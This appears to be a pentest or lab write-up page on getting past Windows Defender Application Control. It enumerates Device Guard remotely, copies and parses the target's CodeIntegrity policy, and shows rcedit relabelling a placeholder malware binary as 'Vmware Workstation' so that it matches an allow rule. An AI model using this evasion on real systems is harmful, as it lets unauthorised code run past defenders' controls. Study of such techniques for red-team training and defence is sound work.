# WDAC

## Enumeration

We need to check also if other security measure are in place like wdac.

{% code overflow="wrap" %}
```powershell
winrs -r:<$Target> "powershell Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard"
```
{% endcode %}

<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/immagine%20(17).png" alt=""><figcaption></figcaption></figure>

We can now attempt to copy and parse the WDAC config deployed on the target to find suitable bypasses and loopholes in the policy.

```
dir \\<$Target>\c$\Windows\System32\CodeIntegrity
```

<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/immagine%20(18).png" alt=""><figcaption></figcaption></figure>

We find a deployed policy named DG.bin.p7 / SiPolicy.p7b in the CodeIntegrity folder. Copy either policy binary back over to our kali.

{% code overflow="wrap" %}
```powershell
copy \\<$Target>L\c$\Windows\System32\CodeIntegrity\DG.bin.p7 C:\AD\Tools
```
{% endcode %}

Now import CIPolicyParser.ps1 to parse the copied policy binary

{% code overflow="wrap" %}
```powershell
ConvertTo-CIPolicy -BinaryFilePath C:\AD\Tools\DG.bin.p7 -XmlFilePath C:\AD\Tools\DG.bin.xml
```
{% endcode %}

<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/immagine%20(19).png" alt=""><figcaption></figcaption></figure>

Noa analyze it to findout that vmware Workstation has allow permission to execute

<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/immagine%20(20).png" alt=""><figcaption></figcaption></figure>

## Abuse

To bypass WDAC we edit File Attributes to match the Product Name: "Vmware Workstation".

{% code overflow="wrap" %}
```powershell
rcedit-x64.exe <$Malware> --set-version-string "ProductName" "Vmware Workstation"
```
{% endcode %}
